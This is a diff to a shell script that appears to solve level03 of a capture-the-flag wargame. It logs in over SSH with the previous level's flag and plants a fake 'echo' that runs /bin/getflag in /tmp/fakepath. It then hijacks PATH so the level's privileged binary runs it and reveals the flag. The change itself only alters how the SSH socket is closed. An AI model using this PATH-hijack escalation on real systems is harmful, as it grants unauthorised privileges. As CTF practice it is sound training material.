@@ -153,13 +153,12 @@ main() {
     level03_username="level03";
     level03_password=$(cat "$CURR_DIR_PATH/../../level02/flag");
 
-    trap 'close_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username"' EXIT USR1;
     init_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username" "$level03_password" || exit 1;
     fakepath_dir="/tmp/fakepath";
     ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "mkdir -p \"$fakepath_dir\"";
     ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo "/bin/getflag" > \"$fakepath_dir/echo\" && chmod +x \"$fakepath_dir/echo\"";
     checkflag=$(ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "PATH=$fakepath_dir:$PATH /home/user/level03/level03" | head -n 1 | awk '{print $NF}');
-    kill -USR1 $$;
+    close_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
